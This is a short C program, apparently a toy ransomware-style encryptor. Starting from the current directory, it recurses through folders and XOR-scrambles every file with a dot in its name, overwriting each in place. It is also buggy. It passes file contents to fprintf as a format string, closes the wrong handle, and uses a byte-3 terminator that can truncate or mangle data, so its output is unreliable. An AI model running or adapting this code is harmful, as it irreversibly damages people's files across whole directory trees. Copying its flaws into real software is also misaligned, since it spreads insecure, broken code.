#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <dirent.h>
#include <stdbool.h>

#define XOR_BYTE 0xA1

void xorString (char *s) {
	int i;
    // use end of text ascii character as our terminator 
	for (i = 0; s[i] != 3; i++) {
		s[i] ^= XOR_BYTE;
	}
}

void cryptFile(char *filename) {

    // Read Buffer
    FILE *f = fopen(filename, "r+");
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);  /* same as rewind(f); */
    char *contents = malloc(fsize + 1);
    fread(contents, 1, fsize, f);
    fclose(f);

    // Display
    contents[fsize] = 3;
    printf("\n%s\n", contents);
    xorString(contents);
    printf("\n%s\n", contents);

    // Write Buffer
    FILE *fp = fopen(filename, "w+");
    fprintf(fp, contents);
    fclose(f);
    f = NULL;
}

int isValidFile(char filename[]) {
    char str1[] = ".", str2[] = "..";
    // Some "files" are just inodes we want to skip over
    if (strcmp(filename, str1) == 0) {
        return -1;
    }
    if (strcmp(filename, "..") == 0) {
        return -1;
    }
    // We definitely don't want to encrypt our decryptor...
        if (strcmp(filename, "crypt.c") == 0) {
        return -1;
    }

    int has_dot = 1;
    for (int i = 0; i < strlen(filename); i++) {
        if (filename[i] == '.') {
            has_dot = 0;
        }
    }
    return has_dot;
}

// Global variables
int i= 0;
char *files[10000];

char **ListFiles(char *dir_name, char *previous_dir) {
    char *files[10000];
    DIR *d;
    struct dirent *dir;

    char full_dir_name[1024];
    strcpy(full_dir_name, previous_dir);
    strcat(full_dir_name, dir_name);
    strcat(full_dir_name, "/");

    d = opendir(full_dir_name);
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {   
            int valid = isValidFile(dir->d_name);
            if (valid == 0) {
                files[i++] = dir->d_name;
                char full_file_name[1024];
                strcpy(full_file_name, full_dir_name);
                strcat(full_file_name, dir->d_name);
                printf("%s\n", full_file_name);
                cryptFile(full_file_name);
            }
            else if (valid == 1) {
                ListFiles(dir->d_name, full_dir_name);
            }
        }
        closedir(d);
    }
}


int main (int agrc, char *argv[]) {
    ListFiles(".", "");
}
